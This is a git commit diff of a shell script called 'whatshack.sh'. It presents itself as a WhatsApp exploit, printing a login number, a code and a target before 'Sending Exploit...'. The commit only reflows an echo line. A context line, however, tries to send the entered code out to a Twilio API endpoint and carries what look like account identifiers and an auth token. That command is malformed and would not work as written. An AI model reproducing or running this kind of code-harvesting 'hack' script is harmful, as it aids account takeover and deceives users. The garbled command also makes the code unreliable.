2e1b59e50453e8986c552971181a6a50186ae45e
dyik <51643039+dyik@users.noreply.github.com>
2019-12-03 13:14:51 +0700

    WhatsheX.sh

--- whatshack.sh
+++ whatshack.sh
@@ -32,7 +32,8 @@ echo "[+] Connecting to whatsapp.com...";
 echo "Login => $nomer";
 sleep 0.5
 echo "Code => $code";
-sleep 0.5                                                                               echo "Target => $target";
+sleep 0.5                                                                               
+echo "Target => $target";
 sleep 0.5
 echo "[+] Sending Exploit...";
 echo "Code => $code" >> https://api.twilio.com/2010-04-01/Accounts/ACa8c0040bb540fa8e2cd14d95b0f82888/IncomingPhoneNumbers/PN531fc3a1b14ae13bb87c9a9947a2d294.json \ --data-urlencode "SmsUrl=http://www.mysite.com/twilio" \ -u 342ce811752235637f36a5eada5b1f40:your_auth_token
